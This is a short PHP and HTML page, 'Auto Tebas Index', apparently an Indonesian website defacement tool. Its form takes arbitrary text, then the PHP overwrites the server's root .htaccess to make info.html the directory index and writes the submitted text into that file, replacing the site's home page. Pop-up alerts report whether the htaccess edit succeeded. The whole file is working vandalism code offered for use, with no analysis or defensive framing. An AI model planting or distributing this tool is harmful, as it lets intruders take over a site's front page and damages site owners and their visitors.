<!Doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="TubagusNM">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syne+Mono&display=swap" rel="stylesheet">
    <title>Auto Tebas Index</title>
  </head>
  <style>
  html, body {
      background-color: #000;
  }
  textarea {
      max-width: 480px;
      align-items: center;
      margin-right: auto;
      margin-left: auto;
  }
  p, .bd {
      margin-top: 30px;
  }
  h1, .btn {
      font-family: 'Syne Mono', monospace;
  }
  h1, p, a, a:hover {
      text-align: center;
      color: #ffc107;
  }
  .nama {
      text-decoration: underline;
  }
  </style>
  <body>

  <div class="container">
  <div class="col-lg bd">
  <form method="post">
  <div class="form-group">
    <h1>Auto Tebas Index</h1>
    <textarea class="form-control" rows="10" name="content" placeholder="Masukan disini..."></textarea>
    </div>
    <div class="text-center">
        <button class="btn btn-warning" type="submit" name="submit">submit</button>
    </div>
    </form>
  </div>
  <div class="footer">
  <p>Make with <span class="heart">❤</span> by <span class="nama"><a href="https://facebook.com/Tubagus19.id" target="_BLANK">TubagusNM</a></span></p>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
</body>
</html>

<?php
if(htmlspecialchars(isset($_POST['submit']))){
	if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/.htaccess','DirectoryIndex info.html') && file_put_contents($_SERVER['DOCUMENT_ROOT'].'/info.html',htmlspecialchars($_POST['content']))){
            echo "<script>
                Swal.fire(
                    'Berhasil!',
                    'htaccess berhasil diedit.',
                    'success'
            )
          </script>";
            }
        elseif(htmlspecialchars($_POST['content'] ===  '')){
            echo "<script>
               Swal.fire(
                    'Perhatian!',
                    'harap isi terlebih dahulu.',
                    'warning'
            )
          </script>";
        }else{
	   echo "<script>
              Swal.fire(
                   'Gagal!',
                   'tidak dapat mengedit htaccess.',
                   'error'
            )
            </script>";
	}
}
?>
